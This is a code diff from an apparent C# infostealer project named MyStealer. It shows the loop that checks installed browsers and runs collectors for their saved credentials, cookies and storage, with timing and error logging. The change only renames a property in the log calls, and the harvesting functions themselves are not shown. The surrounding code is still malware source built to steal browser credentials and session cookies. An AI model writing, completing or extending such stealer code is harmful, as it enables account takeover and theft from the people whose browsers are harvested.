@@ -60,11 +60,11 @@ namespace MyStealer
                         try
                         {
                             var sw = new Stopwatch();
-                            Log.Debug("Check if browser is available: {browser}", browser.ModuleName);
+                            Log.Debug("Check if browser is available: {browser}", browser.Name);
                             if (browser.IsAvailable())
                             {
                                 sw.Start();
-                                Log.Information("Running browser data collector: {browser}", browser.ModuleName);
+                                Log.Information("Running browser data collector: {browser}", browser.Name);
                                 browser.Initialize();
                                 try
                                 {
@@ -78,7 +78,7 @@ namespace MyStealer
                                 }
                                 catch (Exception ex)
                                 {
-                                    Log.Error(ex, "Browser credentials {name} failed.", browser.ModuleName);
+                                    Log.Error(ex, "Browser credentials {name} failed.", browser.Name);
                                 }
 
                                 try
@@ -93,7 +93,7 @@ namespace MyStealer
                                 }
                                 catch (Exception ex)
                                 {
-                                    Log.Error(ex, "Browser cookies {name} failed.", browser.ModuleName);
+                                    Log.Error(ex, "Browser cookies {name} failed.", browser.Name);
                                 }
 
                                 try
@@ -108,16 +108,16 @@ namespace MyStealer
                                 }
                                 catch (Exception ex)
                                 {
-                                    Log.Error(ex, "Browser storages {name} failed.", browser.ModuleName);
+                                    Log.Error(ex, "Browser storages {name} failed.", browser.Name);
                                 }
 
                                 sw.Stop();
-                                Log.Debug("Browser collector {browser} took {time} ms", browser.ModuleName, sw.ElapsedMilliseconds);
+                                Log.Debug("Browser collector {browser} took {time} ms", browser.Name, sw.ElapsedMilliseconds);
                             }
                         }
                         catch (Exception ex)
                         {
-                            Log.Error(ex, "Browser collector {name} failed.", browser.ModuleName);
+                            Log.Error(ex, "Browser collector {name} failed.", browser.Name);
                         }
                         finally
                         {
